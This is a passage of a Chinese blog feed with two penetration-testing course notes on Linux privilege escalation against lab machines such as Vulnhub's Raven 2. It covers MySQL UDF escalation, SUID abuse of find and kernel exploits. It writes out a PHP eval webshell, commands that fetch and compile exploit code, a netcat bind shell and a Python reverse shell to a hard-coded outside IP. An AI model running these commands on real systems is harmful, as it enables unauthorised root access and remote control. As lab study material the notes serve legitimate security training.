href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a></p><p>Vulnhub某靶机-探针IP及端口-利用漏洞获取web权限-信息收集-查看数据库配置文件-利用Mysql提权Linux（Mysql版本区别同Windows）</p><h3 id="探针IP及端口"><a href="#探针IP及端口" class="headerlink" title="#探针IP及端口"></a>#探针IP及端口</h3><p>nmap 192168.46.0&#x2F;24</p><h5 id="利用phpmailer漏洞进行修改并反弹"><a href="#利用phpmailer漏洞进行修改并反弹" class="headerlink" title="利用phpmailer漏洞进行修改并反弹"></a>利用phpmailer漏洞进行修改并反弹</h5><p>python D:&#x2F;Myproject&#x2F;40974.py</p><p>nc -lvvp 4444</p><h5 id="写入后门利用菜刀连接方便操作"><a href="#写入后门利用菜刀连接方便操作" class="headerlink" title="写入后门利用菜刀连接方便操作"></a>写入后门利用菜刀连接方便操作</h5><ul><li><p><code>echo &#39;&lt;?php eval($_POST[x]);?&gt;&#39; &gt;1.php</code></p></li><li><p>上传信息收集脚本进行提权信息收集</p></li><li><p>.&#x2F;LinEnum.sh</p></li><li><p>翻阅数据库配置文件获取root密码</p></li><li><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003146282.png" alt="image-20230424003146282"></p><h6 id="可以找到可利用的文件，但这里展示MYSQL的提权"><a href="#可以找到可利用的文件，但这里展示MYSQL的提权" class="headerlink" title="可以找到可利用的文件，但这里展示MYSQL的提权"></a>可以找到可利用的文件，但这里展示MYSQL的提权</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003323789.png" alt="image-20230424003323789"></p><h6 id="这里找到mysql信息"><a href="#这里找到mysql信息" class="headerlink" title="这里找到mysql信息"></a>这里找到mysql信息</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003501997.png" alt="image-20230424003501997"></p><h6 id="webshell找到配置文件获取MYSQL密码"><a href="#webshell找到配置文件获取MYSQL密码" class="headerlink" title="webshell找到配置文件获取MYSQL密码"></a>webshell找到配置文件获取MYSQL密码</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003534698.png" alt="image-20230424003534698"></p><h6 id="下面用两种方法提权"><a href="#下面用两种方法提权" class="headerlink" title="下面用两种方法提权"></a>下面用两种方法提权</h6></li></ul><h5 id="1、利用Mysql提权-searchsploit（这种手工提权在前面我已经复现过了）"><a href="#1、利用Mysql提权-searchsploit（这种手工提权在前面我已经复现过了）" class="headerlink" title="1、利用Mysql提权 searchsploit（这种手工提权在前面我已经复现过了）"></a>1、利用Mysql提权 searchsploit（这种手工提权在前面我已经复现过了）</h5><p>1、下载mysql udf kali poc进行编译</p><ul><li>wget <a href="https://www.exploit-db.com/download/1518">https://www.exploit-db.com/download/1518</a></li><li>mv 1518 raptor_udf.c</li><li>gcc -g -c raptor_udf.c</li><li>gcc -g -shared -o raptor_udf.so raptor_udf.o -lc</li><li>mv raptor_udf.so 1518.so</li></ul><p>2、上传或下载1518到目标服务器</p><ul><li>wget <a href="https://xx.xx.xx.xx/1518.so">https://xx.xx.xx.xx/1518.so</a></li><li>进入数据库进行UDF导出</li><li>use mysql;</li><li>create table foo(line blob);</li><li>insert into foo values(load_file(‘&#x2F;tmp&#x2F;1518.so’));</li><li>select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;1518.so’;</li></ul><p>3、创建do_system函数调用</p><ul><li>create function do_system returns integer soname ‘1518.so’;</li><li>select do_system(‘chmod u+s &#x2F;usr&#x2F;bin&#x2F;find’);</li></ul><p>4、配合使用find调用执行</p><ul><li>touch xiaodi</li><li>find xiaodi –exec “whoami” ;</li><li>find xiaodi –exec “&#x2F;bin&#x2F;sh” ;</li><li>id</li></ul><h5 id="2、无法外联走隧道-MDUT自动化数据库提权"><a href="#2、无法外联走隧道-MDUT自动化数据库提权" class="headerlink" title="2、无法外联走隧道-MDUT自动化数据库提权"></a>2、无法外联走隧道-MDUT自动化数据库提权</h5><blockquote><p>开启外连：GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘R@v3nSecurity’ WITH GRANT OPTION;</p><p>flush privileges;（刷新）</p></blockquote><ol><li>MDUT 2.0 数据库利用工具  <a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a>  MDUT</li><li>综合高危漏洞利用工具(包含各大数据库)  <a href="https://github.com/Liqunkit/LiqunKit">https://github.com/Liqunkit/LiqunKit</a>_  LiqunKit</li><li>sqlserver利用工具  <a href="https://github.com/uknowsec/SharpSQLTools">https://github.com/uknowsec/SharpSQLTools</a>  SharpSQLTools</li><li>通过套接字重用通过受损的 Microsoft SQL Server 在受限环境中执行横向移动  <a href="https://github.com/blackarrowsec/mssqlproxy">https://github.com/blackarrowsec/mssqlproxy</a>  mssqlproxy</li><li>ODAT：Oracle 数据库攻击工具  <a href="https://github.com/quentinhardy/odat">https://github.com/quentinhardy/odat</a>  ODAT</li></ol><h6 id="由于手工linux的mysql提权较麻烦，所以用到这款工具，填写信息连接成功即可"><a href="#由于手工linux的mysql提权较麻烦，所以用到这款工具，填写信息连接成功即可" class="headerlink" title="由于手工linux的mysql提权较麻烦，所以用到这款工具，填写信息连接成功即可"></a>由于手工linux的mysql提权较麻烦，所以用到这款工具，填写信息连接成功即可</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003630621.png" alt="image-20230424003630621"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003703720.png" alt="image-20230424003703720"></p><h6 id="如果不能连接就用webshell输入sql命令开启外连"><a href="#如果不能连接就用webshell输入sql命令开启外连" class="headerlink" title="如果不能连接就用webshell输入sql命令开启外连"></a>如果不能连接就用webshell输入sql命令开启外连</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004116435.png" alt="image-20230424004116435"></p><h6 id="但是仍然连接不上"><a href="#但是仍然连接不上" class="headerlink" title="但是仍然连接不上"></a>但是仍然连接不上</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004324145.png" alt="image-20230424004324145"></p><h6 id="原因是这个靶场有内置的防火墙过滤"><a href="#原因是这个靶场有内置的防火墙过滤" class="headerlink" title="原因是这个靶场有内置的防火墙过滤"></a>原因是这个靶场有内置的防火墙过滤</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004442515.png" alt="image-20230424004442515"></p><h6 id="所以考虑以下两种方法"><a href="#所以考虑以下两种方法" class="headerlink" title="所以考虑以下两种方法"></a>所以考虑以下两种方法</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004619468.png" alt="image-20230424004619468"></p><h6 id="隧道出网"><a href="#隧道出网" class="headerlink" title="隧道出网"></a>隧道出网</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424004721808.png" alt="image-20230424004721808"></p><h6 id="在哥斯拉webshell管理器上，让其自己来找我们的主机"><a href="#在哥斯拉webshell管理器上，让其自己来找我们的主机" class="headerlink" title="在哥斯拉webshell管理器上，让其自己来找我们的主机"></a>在哥斯拉webshell管理器上，让其自己来找我们的主机</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424005908178.png" alt="image-20230424005908178"></p><h6 id="下面的日志会显示"><a href="#下面的日志会显示" class="headerlink" title="下面的日志会显示"></a>下面的日志会显示</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424005951626.png" alt="image-20230424005951626"></p><h6 id="继续填写信息，这里地址和端口不能填其服务器的了"><a href="#继续填写信息，这里地址和端口不能填其服务器的了" class="headerlink" title="继续填写信息，这里地址和端口不能填其服务器的了"></a>继续填写信息，这里地址和端口不能填其服务器的了</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424010339197.png" alt="image-20230424010339197"></p><h6 id="继续连接，连接成功"><a href="#继续连接，连接成功" class="headerlink" title="继续连接，连接成功"></a>继续连接，连接成功</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424010925178.png" alt="image-20230424010925178"></p><h6 id="还可以利用其他的常用数据库"><a href="#还可以利用其他的常用数据库" class="headerlink" title="还可以利用其他的常用数据库"></a>还可以利用其他的常用数据库</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424011042737.png" alt="image-20230424011042737"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day103 权限提升-Linux系统&amp;辅助项目&amp;脏牛&amp;Dirty&amp;内核漏洞&amp;SUID&amp;GUID</title>
    <link href="http://example.com/2023/04/17/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/"/>
    <id>http://example.com/2023/04/17/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/</id>
    <published>2023-04-17T02:37:12.000Z</published>
    <updated>2023-04-24T06:14:57.992Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423120205114.png" alt="image-20230423120205114"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Linux提权辅助项目-探针&amp;漏扫</p><p>2、Linux提权-配置SUID&amp;内核CVE</p><h3 id="系列内容："><a href="#系列内容：" class="headerlink" title="#系列内容："></a>#系列内容：</h3><p>内核，数据库，第三方服务，SUID&amp;GUID，定时任务，环境变量，SUDO，权限不当等</p><p>脏牛漏洞(CVE-2016-5195)</p><p>Dirty Pipe(CVE-2022-0847)</p><p>SUDO(CVE-2021-3156）</p><p>Polkit(CVE-2021-4034)</p><h3 id="截至目前思路点总结如下："><a href="#截至目前思路点总结如下：" class="headerlink" title="#截至目前思路点总结如下："></a>#截至目前思路点总结如下：</h3><p>1.提权方法有部分适用在不同环境，当然也有通用方法</p><p>2.提权方法也有操作系统版本区分，特性决定方法利用面</p><p>3.提权方法有部分需要特定环境，如数据库,第三方提权等</p><h3 id="思考点："><a href="#思考点：" class="headerlink" title="#思考点："></a>#思考点：</h3><p>1、如何判断采用什么数据库提权？</p><p>2、数据库提权首要条件密码获取？</p><p>3、有那些数据库类型可以进行提权？</p><p>4、操作系统在数据库提权中有那些疑问？</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、Web权限提升</p><p>2、系统权限提升</p><p>3、域控权限提升</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h5 id="1、具体有哪些权限需要我们了解掌握的？"><a href="#1、具体有哪些权限需要我们了解掌握的？" class="headerlink" title="1、具体有哪些权限需要我们了解掌握的？"></a>1、具体有哪些权限需要我们了解掌握的？</h5><p>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等</p><h5 id="2、以上常见权限获取方法简要归类说明？"><a href="#2、以上常见权限获取方法简要归类说明？" class="headerlink" title="2、以上常见权限获取方法简要归类说明？"></a>2、以上常见权限获取方法简要归类说明？</h5><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p><p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p><p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p><p>接口权限：SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入</p><p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p><p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p><h5 id="3、以上常见权限获取后能操作的具体事情"><a href="#3、以上常见权限获取后能操作的具体事情" class="headerlink" title="3、以上常见权限获取后能操作的具体事情?"></a>3、以上常见权限获取后能操作的具体事情?</h5><h5 id="后台权限"><a href="#后台权限" class="headerlink" title="后台权限:"></a>后台权限:</h5><p>常规WEB界面文章分类等操作，后台功能可操作类</p><h5 id="网站权限："><a href="#网站权限：" class="headerlink" title="网站权限："></a>网站权限：</h5><p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p><h5 id="数据库权限："><a href="#数据库权限：" class="headerlink" title="数据库权限："></a>数据库权限：</h5><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p><h5 id="接口权限："><a href="#接口权限：" class="headerlink" title="接口权限："></a>接口权限：</h5><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p><p>系统权限：如同在你自己操作自己的电脑一样</p><p>域控权限：如同在你自己操作自己的虚拟机一样</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="一些文件程序本身不具有root权限，但是root赋予其suid，让其在执行命令的时候才有root权限"><a href="#一些文件程序本身不具有root权限，但是root赋予其suid，让其在执行命令的时候才有root权限" class="headerlink" title="一些文件程序本身不具有root权限，但是root赋予其suid，让其在执行命令的时候才有root权限"></a><code>一些文件程序本身不具有root权限，但是root赋予其suid，让其在执行命令的时候才有root权限</code></h4><h4 id="➢-Linux-辅助项目配置安全-amp-内核漏洞-探针漏扫"><a href="#➢-Linux-辅助项目配置安全-amp-内核漏洞-探针漏扫" class="headerlink" title="➢ Linux-辅助项目配置安全&amp;内核漏洞-探针漏扫"></a>➢ Linux-辅助项目配置安全&amp;内核漏洞-探针漏扫</h4><h4 id="➢-Linux-配置安全SUID提权探针-amp-利用-云服务器"><a href="#➢-Linux-配置安全SUID提权探针-amp-利用-云服务器" class="headerlink" title="➢ Linux-配置安全SUID提权探针&amp;利用-云服务器"></a>➢ Linux-配置安全SUID提权探针&amp;利用-云服务器</h4><h4 id="➢-Linux-内核漏洞本地用户提权-探针-amp-利用-墨者"><a href="#➢-Linux-内核漏洞本地用户提权-探针-amp-利用-墨者" class="headerlink" title="➢ Linux-内核漏洞本地用户提权-探针&amp;利用-墨者"></a>➢ Linux-内核漏洞本地用户提权-探针&amp;利用-墨者</h4><h4 id="➢-Linux-内核漏洞Web用户提权-探针-amp-利用-脏牛"><a href="#➢-Linux-内核漏洞Web用户提权-探针-amp-利用-脏牛" class="headerlink" title="➢ Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛"></a>➢ Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛</h4><h4 id="➢-Linux-内核漏洞本地用户提权-探针-amp-利用-DirtyPipe"><a href="#➢-Linux-内核漏洞本地用户提权-探针-amp-利用-DirtyPipe" class="headerlink" title="➢ Linux-内核漏洞本地用户提权-探针&amp;利用-DirtyPipe"></a>➢ Linux-内核漏洞本地用户提权-探针&amp;利用-DirtyPipe</h4></blockquote><h3 id="Linux-辅助项目配置安全-amp-内核漏洞-探针-amp-漏扫"><a href="#Linux-辅助项目配置安全-amp-内核漏洞-探针-amp-漏扫" class="headerlink" title="#Linux-辅助项目配置安全&amp;内核漏洞-探针&amp;漏扫"></a>#Linux-辅助项目配置安全&amp;内核漏洞-探针&amp;漏扫</h3><p><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p><p><a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a></p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a> </p><p>一个综合类探针：traitor</p><p>一个自动化提权：BeRoot(gtfobins&amp;lolbas)</p><p>两个信息收集：LinEnum linuxprivchecker</p><p>两个漏洞探针：linux-exploit-suggester&amp;2</p><p>二进制文件提权查询：</p><p>Linux：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>Windows：<a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p><h3 id="Linux-配置安全SUID提权-探针-amp-利用-云服务器"><a href="#Linux-配置安全SUID提权-探针-amp-利用-云服务器" class="headerlink" title="#Linux-配置安全SUID提权-探针&amp;利用-云服务器"></a>#Linux-配置安全SUID提权-探针&amp;利用-云服务器</h3><p>漏洞成因：chmod u+s给予了suid u-s删除了suid</p><p>使程序在运行中受到了suid root权限的执行过程导致</p><h5 id="提权过程：探针是否有SUID-手工或脚本-特定SUID利用-利用吃瓜-GG"><a href="#提权过程：探针是否有SUID-手工或脚本-特定SUID利用-利用吃瓜-GG" class="headerlink" title="提权过程：探针是否有SUID(手工或脚本)-特定SUID利用-利用吃瓜-GG"></a><code>提权过程：探针是否有SUID(手工或脚本)-特定SUID利用-利用吃瓜-GG</code></h5><h5 id="手工命令探针安全："><a href="#手工命令探针安全：" class="headerlink" title="手工命令探针安全："></a>手工命令探针安全：</h5><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>find &#x2F; -user root -perm -4000 -exec ls -ldb {} ;</p><h5 id="脚本项目探针安全："><a href="#脚本项目探针安全：" class="headerlink" title="脚本项目探针安全："></a>脚本项目探针安全：</h5><h6 id="LinEnum-sh-、traitor、-linuxprivchecker"><a href="#LinEnum-sh-、traitor、-linuxprivchecker" class="headerlink" title="LinEnum.sh 、traitor、 linuxprivchecker"></a>LinEnum.sh 、traitor、 linuxprivchecker</h6><p>利用LinEnum.sh找到了find关键字</p><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423133851958.png" alt="image-20230423133851958"></p><h5 id="参考利用："><a href="#参考利用：" class="headerlink" title="参考利用："></a>参考利用：</h5><blockquote><h5 id="一些具有suid权限的常用命令获取root的方法："><a href="#一些具有suid权限的常用命令获取root的方法：" class="headerlink" title="一些具有suid权限的常用命令获取root的方法："></a><code>一些具有suid权限的常用命令获取root的方法：</code></h5><p><strong><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></strong></p><p><strong><a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></strong></p></blockquote><ul><li><h6 id="touch-xiaodi（也可以不创建，find搜索一个已知的文件也行）"><a href="#touch-xiaodi（也可以不创建，find搜索一个已知的文件也行）" class="headerlink" title="touch xiaodi（也可以不创建，find搜索一个已知的文件也行）"></a>touch xiaodi（也可以不创建，find搜索一个已知的文件也行）</h6></li><li><h6 id="find-xiaodi-exec-whoami"><a href="#find-xiaodi-exec-whoami" class="headerlink" title="find xiaodi -exec whoami ;"></a>find xiaodi -exec whoami ;</h6></li></ul><p><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423134556359.png" alt="image-20230423134556359"></p><h5 id="利用NC反弹："><a href="#利用NC反弹：" class="headerlink" title="利用NC反弹："></a>利用NC反弹：</h5><ul><li><code>find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;</code> （在被控主机启动一个会话，将5555端口绑定&#x2F;bin&#x2F;sh）</li><li>netcat xx.xx.xx.xx 5555 （本机连接这个会话）</li><li>但是可能不成功，因为有的linux上的nc是低版本，没有参数-e</li><li><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423134914006.png" alt="image-20230423134914006"></li></ul><h5 id="利用Python反弹：（如果上面的不行）"><a href="#利用Python反弹：（如果上面的不行）" class="headerlink" title="利用Python反弹：（如果上面的不行）"></a>利用Python反弹：（如果上面的不行）</h5><ul><li><code>find xiaodi -exec python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.94.236.117&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; \;</code>   （用python编写代码连接，这个代码在棱角社区有,其主机没有python命令，就写python3尝试）</li><li>nc -lvvp 7777</li><li><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423135554585.png" alt="image-20230423135554585"></li><li>find xiaodi -exec whoami ;</li><li><img src="/../images/Day103-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE-%E8%84%8F%E7%89%9B-Dirty-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-SUID-GUID/image-20230423135729449.png" alt="image-20230423135729449"></li></ul><h3 id="Linux-内核漏洞本地用户提权-探针-amp-利用-Mozhe-CVE-2017-16695"><a href="#Linux-内核漏洞本地用户提权-探针-amp-利用-Mozhe-CVE-2017-16695" class="headerlink" title="#Linux-内核漏洞本地用户提权-探针&amp;利用-Mozhe CVE-2017-16695"></a>#Linux-内核漏洞本地用户提权-探针&amp;利用-Mozhe CVE-2017-16695</h3><h5 id="提权过程：连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG"><a href="#提权过程：连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG" class="headerlink" title="提权过程：连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG"></a><code>提权过程：连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG</code></h5><ul><li>探针项目：BeRoot linux-exploit-suggester linux-exploit-suggester2</li><li>gcc 45010.c -o exp</li><li>chmod +x exp</li><li>.&#x2F;exp</li><li>id</li></ul><h6 